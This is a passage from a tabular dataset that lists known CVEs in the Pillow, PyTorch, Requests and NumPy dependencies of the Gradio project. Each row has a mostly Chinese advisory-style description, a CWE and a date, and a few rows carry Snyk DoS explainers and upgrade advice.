* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
gradio-app_gradio,pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
gradio-app_gradio,pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
gradio-app_gradio,pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
gradio-app_gradio,pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
gradio-app_gradio,pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
gradio-app_gradio,pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
gradio-app_gradio,pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
gradio-app_gradio,pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
gradio-app_gradio,pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
gradio-app_gradio,pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
gradio-app_gradio,pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
gradio-app_gradio,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
gradio-app_gradio,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
gradio-app_gradio,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
gradio-app_gradio,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
gradio-app_gradio,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
gradio-app_gradio,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
gradio-app_gradio,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
